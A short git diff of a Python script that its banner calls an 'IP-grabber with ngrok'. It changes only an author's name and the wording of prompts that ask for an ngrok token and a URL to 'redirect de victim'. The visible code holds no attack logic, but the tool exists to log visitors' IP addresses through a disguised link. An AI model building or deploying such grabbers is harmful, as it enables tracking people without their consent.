@@ -77,13 +77,13 @@ def banner():
 |_ _|  _ \ / ___|  _ \    / \  | __ )\n \
  | || |_) | |  _| |_) |  / _ \ |  _ \ \n \
  | ||  __/| |_| |  _ <  / ___ \| |_) |\n \
-|___|_|    \____|_| \_\/_/   \_\____/\n Python IP-grabber with ngrok - By Luiz Vianna \n \t\t| github.com/luizviana |\n\n")
+|___|_|    \____|_| \_\/_/   \_\____/\n Python IP-grabber with ngrok - By Luiz Viana \n \t\t| github.com/luizviana |\n\n")
     print ban
 
 def options():
     global url
     global auth
-    print "Hey, this program needs ngrok to work, sign up at https://ngrok.com/ and copy your authtoken at https://dashboard.ngrok.com/auth. \nPick a url to redirect de victim. (example https://twitter.com/)\n"
+    print "Hey, this program needs ngrok to work, sign up at https://ngrok.com/ and copy your authtoken at https://dashboard.ngrok.com/auth. \nSet a url to redirect de victim. (example https://twitter.com/)\n"
 
     auth = raw_input("[ + ] NGROK authtoken --> ")
     while True:
@@ -91,7 +91,7 @@ def options():
         if not re.findall('https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', url):
             print "[ ? ] Bad format ;-; (example http://example.com)"
         else:
-            print "[ ! ] Your link will be redirect to " + url + "\n"
+            print "[ ! ] The link will redirect to " + url + "\n"
             break
 
 
